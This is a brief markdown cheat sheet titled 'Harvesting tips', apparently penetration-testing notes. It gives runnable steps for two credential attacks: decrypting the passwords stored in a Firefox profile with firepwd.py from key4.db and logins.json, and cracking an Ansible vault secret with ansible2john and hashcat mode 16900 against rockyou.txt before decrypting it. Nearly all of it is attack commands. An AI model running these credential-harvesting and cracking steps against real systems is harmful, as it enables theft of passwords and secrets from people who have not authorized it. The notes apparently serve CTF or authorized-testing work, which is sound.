# Harvesting tips


## firefox - decrypt firefox db password
```
wget https://raw.githubusercontent.com/lclevy/firepwd/master/firepwd.py
wget https://raw.githubusercontent.com/lclevy/firepwd/master/requirements.txt
pip3 install -r requirements.txt

File ncessary for decryption : key4.db and logins.json
```

## Ansible - decryot ansible vault
```
# Ansible - decryot ansible vault
Blogpost : https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/

cat defaults/main.yml
---
...
pwm_admin_login: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    <SNIP>
pwm_
    ...
    <SNIP>
...

- convert to a crackable format using ansible2john.py
sed -i 's/^[ \t]*//' vault1
cat vault1
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438

- convert each one using ansible2john.py
python3 /usr/share/john/ansible2john.py vault1
...

-  hashes using Hashcat (mode 16900). We can feed the hashes to Hashcat using the rockyou.txt wordlist, after trimming off the front part of the hash (they should start with $ansible$ )
hashcat -m 16900 vault_hashes /usr/share/wordlists/rockyou.txt

- install ansible-vault from pip to decrypt the encrypted strings found in the files :
cat vault1 | ansible-vault decrypt # Then prompted for passwd


```